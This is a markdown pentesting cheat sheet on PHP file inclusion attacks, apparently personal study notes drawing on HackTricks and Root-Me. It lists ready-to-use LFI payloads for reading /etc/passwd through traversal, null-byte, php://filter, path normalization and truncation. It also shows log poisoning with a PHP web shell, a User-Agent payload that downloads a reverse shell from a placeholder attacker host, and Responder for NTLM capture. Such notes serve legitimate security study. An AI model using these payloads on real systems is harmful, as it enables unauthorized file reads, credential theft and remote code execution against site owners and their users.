## Local file inclusion (LFI)

Basically occurs when a php web page take an other page to display in parameter.

***Example :***  
https://example.com/index.php?page=foo.php


#### Vulnerabilities
Vulnerabilities can be found using some parameter modifications

https://example.com/index.php?page=/etc/passwd
https://example.com/index.php?page=
https://example.com/index.php?page=./



### Filters

- Absolute path bypass
https://example.com/index.php?page=../../../../etc/passwd

- Extension bypass
https://example.com/index.php?page=../../../../etc/passwd%00

- Base64 bypass
php://filter/read=convert.base64-encode/resource=/etc/passwd
php://filter/read=convert.base64-encode/resource=./../../etc/passwd  
https://example.com/index.php?page=php://filter/convert.base64-encode/resource=/etc/passwd  
https://example.com/index.php?page=php://filter/convert.base64-encode/resource=./../../etc/passwd  


# Tricks to bypass

```
bypass "../" with "..././"
bypass "../" with "....//"
```

## LFI2RCE / Log Poisonning

If the Apache or Nginx server is vulnerable to LFI inside the include function you could try to access to /var/log/apache2/access.log or /var/log/nginx/access.log, set inside the user agent or inside a GET parameter a php shell like `<?php system($_GET['c']); ?>` and include that file

## Remote file inclusion from log poisonning (RCE)
```php
User-Agent: <?php file_put_contents('/tmp/reverse_shell.php', file_get_contents('http://ATTAQUER_IP:ATTACKER_PORT/reverse_shell.php'))?>
```
Then go to /rev.php to start the reverse shell
In order to work, the php have to be in cleartext when it's read by the webpage  
e.g. if it appears in b64, nothing will work

# Remote file Inclusion

## Tools
- responder

### Responder

The `responder` utilisty can catch requests from many fake created servers such as `HTTP`  
This can sometimes leads to NTLM leaks

***Usage :***  
To start responder, you must select an interface 
```bash
responder -I INTERFACE_NAME
```

# PHP Path Normalization Attacks

In PHP, `.` and `/` are normalized when requesting for a file which can be used to bypass filters.
PHP functions can open files that `/bin/cat` can't because of the path normalization
**Main Usage :**
- Blacklist bypass on write functions (file editors, file writing, etc)
- Blacklist bypass on read functions (source disclosure, etc)
- Regular expressions and IDS/IPS signature evasion

**Example :**
```
../../../etc/passwd....... # Will be interpreted as /etc/passwd
../../../etc/passwd\.\.\.\ # Will be interpreted as /etc/passwd
./../../etc/passwd/./.././ # Will be interpreted as /etc/passwd
./../../etc/././passwd/./. # Will be interpreted as /etc/passwd
./../../etc/////passwd/./. # Will be interpreted as /etc/passwd
```

# PHP Path Truncation Attacks

- In PHP, the path is "`truncated`" at a certain point
	- Defined in MAXPATHLEN variable **(usually 4096bits)**
- It means that when including a filename longer than a certain length only the first part, the one that fits the buffer, will reach the real syscalls.
- In PHP filesystem functions are not binary safe a nullbyte can be used.
	- But functions like `addslashes()` can be use to solve the problem
	- `magic_quotes` is implicitly called on all GPC ans SERVER inputs (understand `addslashed()`
- **With Path Truncation Attacks, you are trying to overflow the suffix of a file inclusion**
- `/.` is completely wiped when looking in the filesystem

**Example** : Here `.php` is the suffix we want to bypass
```php
<?php 
// I'm a classic LFI (Local File Inclusion) vulnerabiltiy!
include("includes/".$_GET['file'].".php"); 
?>
```

**Payloads :**
```php
# With a
?file=a/../../../../../../../../../etc/passwd......[ADD MORE]....
?file=a/../../../../../../../../../etc/passwd/././.[ADD MORE]/././.
?file=a/./.[ADD MORE]/etc/passwd
?file=a/../../../../[ADD MORE]../../../../../etc/passwd
# Without a
?file=../../../../../../../../../etc/passwd......[ADD MORE]....
?file=../../../../../../../../../etc/passwd/././.[ADD MORE]/././.
?file=./.[ADD MORE]/etc/passwd
?file=../../../../[ADD MORE]../../../../../etc/passwd
```
**Note** Relative paths can start with `a` in order to make the length odd, without the `a`, the request will be even
- Playing on `odd` and `even` requests is important because, otherwise, `/.` will not be fully normalized for example


# Sources
- https://book.hacktricks.xyz/pentesting-web/file-inclusion
- https://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20PHP%20path%20truncation.html?_gl=1*1opjpib*_ga*MTYxMDQ3MzgyMC4xNzE4MzU2NTIx*_ga_SRYSKX09J7*MTcxOTUxMzM0NS4yNy4xLjE3MTk1MTQ2MjkuMC4wLjA.